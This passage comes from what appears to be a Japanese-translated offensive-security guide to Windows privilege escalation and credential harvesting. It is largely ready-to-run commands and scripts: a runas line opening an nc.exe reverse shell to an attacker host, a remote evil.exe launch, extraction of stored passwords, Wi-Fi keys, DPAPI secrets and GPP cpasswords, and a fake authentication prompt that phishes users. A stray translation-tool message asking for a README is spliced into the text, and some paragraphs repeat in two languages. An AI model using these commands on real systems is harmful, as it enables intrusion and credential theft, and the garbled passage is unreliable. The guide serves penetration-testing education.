- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny リストを維持する。


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

PATH 内のすべてのフォルダの権限を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされた他の既知のコンピュータがないか確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**アクセス制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧表示、ルールの作成、無効化、無効化...)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも見つかります。

もし root user を取得すれば、任意のポートで listen できます（最初に `nc.exe` を使ってポートで listen すると、GUI で `nc` を firewall に許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash を root として簡単に起動するには、`--default-user root` を試してください

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で `WSL` のファイルシステムを参照できます

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャ / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault は、Windows がユーザーを自動的にログインさせられるサーバー、ウェブサイト、その他のプログラム向けのユーザー資格情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザで自動ログインするためのものに見えるかもしれませんが、実際はそうではありません。

Windows Vault は Windows が自動ログインできる資格情報を保存します。つまり、リソース（サーバーやウェブサイト）にアクセスするために資格情報を必要とする任意の **Windows application that needs credentials to access a resource** は、この **Credential Manager** と Windows Vault を利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの資格情報を利用することはできないと思われます。したがって、アプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために、何らかの方法で **credential manager と通信して資格情報を要求する** 必要があります。

マシンに保存されている資格情報を一覧表示するには `cmdkey` を使用します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために`runas`を`/savecred`オプション付きで使用できます。次の例はSMB share経由でリモートバイナリを呼び出すものです。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報を使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) からも取得できます。

### DPAPI

The **Data Protection API (DPAPI)** は、データの対称暗号化の手法を提供し、主に Windows オペレーティングシステム内で非対称秘密鍵の対称暗号化に使用されます。この暗号化は、ユーザーまたはシステムのシークレットを利用してエントロピー（ランダム性）に大きく寄与します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用して暗号化されたユーザーの RSA キーは %APPDATA%\Microsoft\Protect\{SID} ディレクトリに保存されます。ここで {SID} はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護するマスターキーと同じ場所に格納されている DPAPI キーは、通常 64 バイトのランダムデータで構成されます。**（このディレクトリへのアクセスは制限されており、CMD の dir コマンドで内容を一覧表示することはできませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を付けて、**mimikatz module** `dpapi::masterkey` を使用することでそれを復号できます。

**credentials files protected by the master password** は通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を指定して **mimikatz module** `dpapi::cred` を使って復号できます。\
`sekurlsa::dpapi` モジュールを使えば、**memory** から多くの **DPAPI** **masterkeys** を抽出できます（**root** の場合）。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell 資格情報** は、暗号化された資格情報を便利に保存する方法として、**scripting** や自動化タスクでよく使われます。これらの資格情報は **DPAPI** によって保護されており、通常、作成されたのと同じユーザーかつ同じコンピュータ上でしか復号できません。

ファイルに含まれる PowerShell 資格情報を **復号する** には、次のようにします：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

以下の場所で見つけることができます: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行されたコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
適切な `/masterkey` を指定して **Mimikatz** の `dpapi::rdg` モジュールを使用すると、**任意の .rdg ファイルを復号**できます\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz の `sekurlsa::dpapi` モジュールを使用して、メモリから多くの **DPAPI masterkeys を抽出**できます

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
Windows のワークステーションでは StickyNotes アプリがパスワードやその他の情報を **保存** するために使われることが多く、それがデータベースファイルであることに気づいていない場合がよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に見つけて調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
**AppCmd.exe からパスワードを回復するには Administrator 権限が必要で、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの **credentials** が設定されており、**回復** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):  
このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する。\
インストーラは **run with SYSTEM privileges** で実行されます。多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty の SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSHキー

SSHのプライベートキーはレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリがあれば、おそらく保存された SSH キーです。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます.\  
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

もし `ssh-agent` サービスが実行されておらず、起動時に自動的に開始したい場合は、次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。ssh keys を作成し、`ssh-add`で追加してsshでマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称キー認証中に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル名が **SiteList.xml** のファイルを検索する

### Cached GPP パスワード

以前は、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は、任意のドメインユーザがアクセスできました。第二に、これらの GPP 内のパスワードは、公開されているデフォルトキーを用いて AES256 で暗号化されていましたが、任意の認証済みユーザが復号できました。そのため、権限昇格につながる重大なリスクがありました。

このリスクを軽減するため、"cpassword" フィールドが空でないローカルにキャッシュされた GPP ファイルを検索する関数が作られました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。オブジェクトには GPP の詳細やファイルの場所が含まれ、脆弱性の特定と対処に役立ちます。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使って passwords を取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentialsを要求する

ユーザーがそれらを知っていると思われる場合、常に **ユーザーに自身の credentials、あるいは別のユーザーの credentials を入力するよう頼む** ことができます（ただし、クライアントに直接 **尋ねる** ことで **credentials** を要求するのは非常に **リスキー** である点に注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

かつて **passwords** が **clear-text** または **Base64** で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
ファイルの内容が提供されていません。src/windows-hardening/windows-local-privilege-escalation/README.md の内容を送ってください。
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内のCredentials

Bin内のCredentialsも確認してください

いくつかのプログラムに保存された**パスワードを復元する**には次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry内

**Credentialsを含むその他の可能なregistryキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザ履歴

パスワードが保存されている **Chrome or Firefox** の dbs を確認してください。\
またブラウザの履歴、ブックマーク、お気に入りも確認し、そちらに **パスワードが** 保存されている可能性があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL の上書き**

**Component Object Model (COM)** は、Windows オペレーティングシステム内に組み込まれた技術で、異なる言語で書かれたソフトウェアコンポーネント間の **相互通信** を可能にします。各 COM コンポーネントは **class ID (CLSID)** で識別され、各コンポーネントは 1 つ以上のインターフェースを介して機能を公開し、それらは interface ID (IIDs) で識別されます。

COM クラスとインターフェースは、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下でレジストリに定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** と **HKEY\CURRENT\USER\Software\Classes** をマージして作成されたもの、つまり **HKEY\CLASSES\ROOT** です。

このレジストリの CLSID の中には子キー **InProcServer32** があり、そこには **デフォルト値** として **DLL** を指す値と、**ThreadingModel** という値が含まれます。ThreadingModel は **Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルまたはマルチ）、または **Neutral**（スレッドニュートラル）になり得ます。

![](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを**上書き**できる場合、その DLL が別のユーザーによって実行されるのであれば **権限昇格** できる可能性があります。

攻撃者が COM Hijacking を永続化のメカニズムとしてどのように利用するかを学ぶには、次を参照してください：

{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよびレジストリ内の汎用的なパスワード検索**

**ファイルの内容を検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリ内でキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### passwords を検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin。私はこのプラグインを作成しました。これはターゲット内で**automatically execute every metasploit POST module that searches for credentials**を実行します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているpasswordsを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) はシステムからpasswordを抽出するもう一つの優れたツールです。

ツール[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータをclear textで保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の**sessions**, **usernames** および **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## その他

### Windowsで実行される可能性のあるファイル拡張子

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからのパスワード窃取

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース (via console or RDP) にアクセスでき、UAC が有効な場合、いくつかの Microsoft Windows のバージョンでは、特権のないユーザーから "NT\AUTHORITY SYSTEM" のようなターミナルや他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して同時に権限昇格と UAC のバイパスが可能になります。さらに、何もインストールする必要はなく、プロセス中に使用される binary は署名され Microsoft によって発行されています。

影響を受けるシステムの一部は以下の通りです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
